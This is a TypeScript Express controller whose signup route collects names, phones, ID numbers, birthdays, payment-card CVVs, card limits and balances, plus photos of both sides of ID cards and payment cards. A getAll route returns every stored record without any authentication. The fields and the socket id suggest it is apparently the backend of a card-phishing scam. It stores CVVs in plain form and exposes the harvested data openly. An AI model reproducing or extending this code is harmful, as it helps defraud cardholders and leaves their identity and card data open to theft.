import { Request, Response } from "express";
import { Account } from "../models/account.model";

export class AccountController {
  async signup(req: Request, res: Response) {
    try {
      const {
        email,
        name,
        phone,
        idCard,
        birthday,
        cvv,
        cardLimit,
        cardBalance,
        proposeLimit,
        cardType,
        accountNumber,
        socketId,
      } = req.body;

      let frontIdCard = "";
      let backIdCard = "";
      let frontCard = "";
      let backCard = "";

      if (req.files) {
        const files = req.files as {
          [fieldname: string]: Express.Multer.File[];
        };

        if (!files.frontIdCard || !files.backIdCard) {
          return res.status(400).json({
            message: "Front and back of ID card are required",
          });
        }

        // if (!files.frontCard || !files.backCard) {
        //   return res.status(400).json({
        //     message: "Front and back of card are required",
        //   });
        // }

        frontIdCard =
          files.frontIdCard.length > 0 ? files.frontIdCard[0].path : "";
        backIdCard =
          files.backIdCard.length > 0 ? files.backIdCard[0].path : "";
        frontCard = files.frontCard.length > 0 ? files.frontCard[0].path : "";
        backCard = files.backCard.length > 0 ? files.backCard[0].path : "";
      }

      const account = new Account({
        email,
        name,
        phone,
        frontIdCard,
        backIdCard,
        idCard,
        birthday,
        cvv,
        frontCard,
        backCard,
        cardLimit,
        cardBalance,
        proposeLimit,
        cardType,
        socketId,
        accountNumber,
      });

      await account.save();

      return res.status(200).json({
        message: "Signup successfully",
      });
    } catch (error: any) {
      return res.status(500).json({
        message: error.message,
      });
    }
  }

  async getAll(req: Request, res: Response) {
    try {
      const accounts = await Account.find();

      return res.status(200).json({
        accounts,
      });
    } catch (error: any) {
      return res.status(500).json({
        message: error.message,
      });
    }
  }
}
